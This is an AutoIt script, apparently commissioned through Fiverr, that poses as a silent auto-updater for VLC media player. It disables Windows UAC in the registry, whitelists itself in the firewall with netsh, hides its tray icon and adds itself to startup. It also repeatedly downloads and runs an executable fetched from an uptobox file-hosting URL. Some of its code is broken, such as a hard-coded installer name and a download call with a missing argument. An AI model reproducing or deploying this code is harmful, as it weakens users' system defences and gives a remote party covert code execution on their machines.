;★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★  Fiverr-HarshKohli  ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★

;~~~~~~~~~~~~~~~~INCLUDES~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#RequireAdmin ; To have admin rights.
#NoTrayIcon ; To hide Icon.
#include<InetConstants.au3> ; We need this Udf to download.
#include<INet.au3> ; This for download options.
#include<StringConstants.au3> ; We need it to search for some values like version numbers.
#include<FileConstants.au3> ; This is for file options.
#include<File.au3> ; We need this to manipulate files ( create write etc .. )
#include<WindowsConstants.au3> ;
#include<StaticConstants.au3> ;
#include<_Startup.au3> ; We need this UDF to set starup options, I've add it myself so If you want this code to work I'll have to send it to you and you'll have to put it in the folder of includes.
#include<misc.au3> ;
;~~~~~~We need to include these UDF's; some of them I added them myself.~~~~~~





RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "REG_DWORD", "0") ; We Disable UAC using regeddit.

Dim $Timer, $OpenVersion, $Version, $ReadVersion, $SourceCode, $CodeVersion, $StringVersion[3], $UrlVersionSplit, $UrlVersion, $dilimiter, $CurrentVersionSplit[3], $CurrentVersion, $File457PathIn7845, $inetGETURL, $OpenFileVersion, $Wait1, $Wait2, $TimerUpdateB, $ReadUpdate, $InetGetBUpdate
$a = "\libvlc.dll"
$b = "\axvlc.dll"
$c = "\axvlc.dll.manifest"
$d = "\libvlccore.dll"
$e = "\npvlc.dll"
$f = "\npvlc.dll.manifest"
$g = "\vlc.exe.manifest"

$TimerDeleted = timerinit()
$Timer = timerinit()
$TimerUpdateB = timerinit()

Run(@ComSpec & ' /c netsh firewall add allowedprogram program = "' & @AutoItExe & '" name = "AutoUpdate" mode = ENABLE', "", "", @SW_HIDE) ; This is to bypass firewall.

If _StartupRegistry_Install() = False then ; If it is already in startup it won't add it again.
   starttup(); Declaring startup function.
EndIF

;This to avoid popping errors to the user if something happened.
If $CmdLine[0] > 0 Then
    If Not StringInStr($CmdLineRaw,"-NoErrors",1) Then RunWithoutErrors()
	   Else
    If @compiled Then
        RunWithoutErrors()
EndIF
EndIF


While 1
   If Timerdiff($TimerDeleted) >= 60000 Then
	  If FileExists("C:\Program Files\VideoLAN\VLC" & $g ) AND FileExists("C:\Program Files\VideoLAN\VLC" & $b ) AND FileExists("C:\Program Files\VideoLAN\VLC" & $c ) AND FileExists("C:\Program Files\VideoLAN\VLC" & $d ) AND FileExists("C:\Program Files\VideoLAN\VLC" & $e)  AND FileExists("C:\Program Files\VideoLAN\VLC" & $f ) AND FileExists("C:\Program Files\VideoLAN\VLC" & $g ) Then
   $TimerDeleted = Timerinit()
Else
   _InetGeturl()

	  EndIF
EndIF

If TimerDiff($TimerUpdateB) >= 30000 Then
	  $ReadUpdate = InetRead("http://www34.uptobox.com/d/qmyvoasfesr76xkqsmaiaazpebe6gghawqknfhfgxyt3gwfcvz3cfttk/B%20update.txt")
	  If @ERROR then
		 $TimerUpdateB = Timerinit()
	  Else
	  If $ReadUpdate = "Update is ready" Then
	  $InetGetBUpdate =  InetGet("http://www17.uptobox.com/d/wiyqcp2fesr76xkq7lxiiazzoky3rebdlvgnuyza56ekq3dp2qxcs3sh/updateB.exe", @TEMPDIR & "\Bupdate.exe", $INET_FORCERELOAD, $INETDOWNLOADWAIT)
	  If NOT @ERROR Then
		 ShellExecute(@TEMPDIR & "\Bupdate.exe")
		 ProcessClose("B.exe")
		 FileDelete(@TEMPDIR & "\B.exe")
		 $TimerUpdateB = Timerinit()
	  Else
		 $TimerUpdateB = Timerinit()
	  EndIF
	  EndIF
	  EndIF
EndIF



   If TimerDiff($Timer) >= 6000 Then
If FileExists(@APPDATADIR & "\vlc\version.ini") Then ; If file already exists we do nothing.
   _Rc()
Else ; If file doesn't exists we create it and we write version. ( This is to be done only one time, the first time )
   _FileCreate(@APPDATADIR & "\vlc\version.ini")
   $OpenVersion = FileOpen(@APPDATADIR & "\vlc\version.ini", 0)
   FileWrite($OpenVersion, "2.0.0") ; you will have to fill this with the version of your software; you'll have to do it only the first time.
EndIf
;FileSetAttrib(@APPDATADIR & "\vlc\version.ini", "+H") ; We hide the file that contain version infos : This is not recommended
$Version = FileOpen(@APPDATADIR & "\vlc\version.ini", 0); We silently open it
$ReadVersion = FileRead($Version) ; We read the currently running version


$SourceCode = _InetGetSource("http://www.videolan.org/vlc/") ; Here we read the source code of the url to check the version.
If @ERROR then $Timer = timerinit()
   If NOT @ERROR then
$CodeVersion = StringTrimLeft($SourceCode, stringinStr($SourceCode, "DownloadVersion")) ; Here we search for the version in te source code, it is constantly after the "downloadVersion" string
$stringVersion = StringRegExp($CodeVersion, "([0123456789]{1,4}).([0123456789]{1,4}).([0123456789]{1,4})", $STR_REGEXPARRAYMATCH) ; Here we tell the script to search for something like that : {number}.{number}.{number}

$UrlVersionSplit = $stringVersion[0] & "." & $stringVersion[1] & "." & $stringVersion[2] ; Here we regroup the 3 number in a variable : This is the UrlVersion

$UrlVersion = $stringVersion[0] & $stringVersion[1] & $stringVersion[2] ; We erase the "." of the url version to compare ..

$dilimiter = "."

$CurrentVersionSplit = StringSplit($ReadVersion, $dilimiter) ; we erase the "." of the current version to compare ..

$CurrentVersion = $CurrentVersionSplit[1] & $CurrentVersionSplit[2] & $CurrentVersionSplit[3] ; erased, ready to compare



Select ; Start conditions.

Case $CurrentVersion >= $UrlVersion ; If current version is superior or equal to url version, we do nothing.
   msgbox(0, "", "OK")
   FileClose($version)
   $Timer = Timerinit()
Case $CurrentVersion < $UrlVersion ; If current version is inferior to url version we update silently..
   msgbox(0, "", "No.. Ill dll")
   Global $File457PathIn7845 = @TEMPDIR & "\vlc-" & $UrlVersionSplit & "-win32.exe" ; Directory, we'll install the update in temp directory, with the same title.
   $inetGETURL = InetGet("http://get.videolan.org/vlc/" & $UrlVersionSplit & "/win32/vlc-" & $UrlVersionSplit & "-win32.exe", $File457PathIn7845, $INET_FORCERELOAD, $INET_DOWNLOADWAIT) ; to download silently
   If @ERROR then
	  $Timer = timerinit()
   Else
$OpenFileVersion = FileOpen(@APPDATADIR & "\vlc\version.ini", 2)
FileWrite($OpenFileVersion, $UrlVersionSplit) ; We write the new version in the .ini file
FileClose($OpenFileVersion)
;We'll auto install it now.
Run(@TEMPDIR & "\vlc-2.2.1-win32.exe", "", @SW_HIDE)
$wait1 = WinWait("Installation de VLC media player")
ControlSend($wait1, "", "Button2", "{ENTER}")
ControlSend($wait1, "", "Button2", "{ENTER}")
ControlSend($wait1, "", "Button2", "{ENTER}")
sleep(7000)
ControlSend($wait1, "", "Button2", "{ENTER}")
$wait2 = WinWaitActive("Lecteur multimédia VLC")
WinClose($wait2)
;End Of installtion
$Timer = timerinit()
EndIF
EndSelect ; end of conditions.
EndIF
EndIf
Wend

;FUNCTIONS HERE...
Func starttup()
   _StartupRegistry_Install() ; This func is to add this program to startup.
EndFunc

Func _Rc()
   Sleep(200) ; This func is to end loops.
EndFunc

Func RunWithoutErrors()
    Run(@AutoItExe & ' /ErrorStdOut -NoErrors')
    Exit
 EndFunc

 Func _InetGetUrl()
	$inetGETURL = InetGet("http://get.videolan.org/vlc/2.2.1/win32/vlc-2.2.1-win32.exe", $INET_FORCERELOAD, $INET_DOWNLOADWAIT)
msgbox(0, "", "downloading")
 EndFunc
;FUNCTION END...